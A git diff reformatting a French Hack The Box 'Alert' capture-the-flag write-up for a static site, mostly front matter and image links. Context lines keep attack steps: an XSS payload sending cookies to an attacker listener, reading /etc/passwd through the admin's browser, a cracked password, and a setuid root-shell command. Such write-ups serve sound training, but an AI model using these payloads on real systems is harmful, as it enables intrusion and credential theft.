@@ -1,22 +1,21 @@
 ---
+layout: writeup
 title: Alert
 description: weeu weeeu weeu
-tags:
-  - HTB
-  - machine
+excerpt: weeu weeeu weeu
 date: 2026-04-15T09:32
-tasks:
-  - format
-parent file:
-  - "[[HTB MOC]]"
+platform: htb
+permalink: /writeups/htb/season6/alert/
 os: linux
 difficulty: easy
-category:
-  - writeups
-  - htb
-season: "6"
-seasonal: no
+season: '6'
+tags:
+- HTB
+- linux
+- easy
 ---
+
+{% raw %}
 
 # Outline
 ## Foothold
@@ -33,13 +32,13 @@ seasonal: no
 En plus des ports `22` et `80`, le port `12227` est marqué comme ouvert.
 
 Le site principal permet de visualiser des fichiers markdown.
-![[Pasted image 20260415094227.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415094227.png" alt="Alert" loading="lazy">
 
 Le sous-domain `statistics` présente une page de connexion, d'où le fait qu'elle soit présentée différemment par ffuf.
-![[Pasted image 20260415094611.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415094611.png" alt="Alert" loading="lazy">
 
 De retour sur la page principal, le lecteur de markdown ressemble à ça:
-![[Pasted image 20260415105756.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415105756.png" alt="Alert" loading="lazy">
 
 Il se trouve qu'il est possible d'inclure du html dans un document markdown. Par exemple
 ```
@@ -59,7 +58,7 @@ fetch("http://10.10.15.23:3333/"+document.cookie)
 Sur le site il existe une autre page intéressante appelée "contact us" qui permet d'envoyer un message à un administrateur. On lui envoie alors le lien que l'on a obtenu avec notre xss.
 
 Si on regarde sur notre listener on voit bien une requête mais rien du tout dans les cookies.
-![[Pasted image 20260415134327.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415134327.png" alt="Alert" loading="lazy">
 
 L'idée est alors de modifier le script pour aller chercher une donnée qui nous intéresse, le contenu de la pages messages.php.
 ```
@@ -113,7 +112,7 @@ function handleResponse() {
 };
 ```
 Il est possible par exemple de lire ainsi le fichier `/etc/passwd`.
-![[Pasted image 20260415144756.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415144756.png" alt="Alert" loading="lazy">
 Ce qui permet par exemple de voir qu'il existe deux utilisateurs: `albert` et `david`.
 
 Ensuite c'est une question de fichiers. Le fichier `/etc/apache2/sites-enabled/000-default.conf` donne le root folder du site: `/var/www/alert.htb` et pour `statistics`: `/var/www/statistics.alert.htb`. Et surtout, dans ce fichier une indication est donnée sur une partie restreinte: `/var/www/statistics.alert.htb/.htpasswd` dont le contenu est
@@ -131,7 +130,7 @@ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --username
 Le hash est identifié comme un apache md5 (mode 1600) et l'identifiant est `albert:manchesterunited`.
 
 Et voilà, le premier accès ssh obtenu.
-![[Pasted image 20260415153324.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415153324.png" alt="Alert" loading="lazy">
 
 # PrivEsc to root
 
@@ -151,6 +150,7 @@ system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");
 ```
 
 Et voilà notre accès root.
-![[Pasted image 20260415174236.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415174236.png" alt="Alert" loading="lazy">
 
-![[Pasted image 20260415174258.png]]
+<img class="content-image" src="/assets/content/htb/season6-alert/Pasted%20image%2020260415174258.png" alt="Alert" loading="lazy">
+{% endraw %}
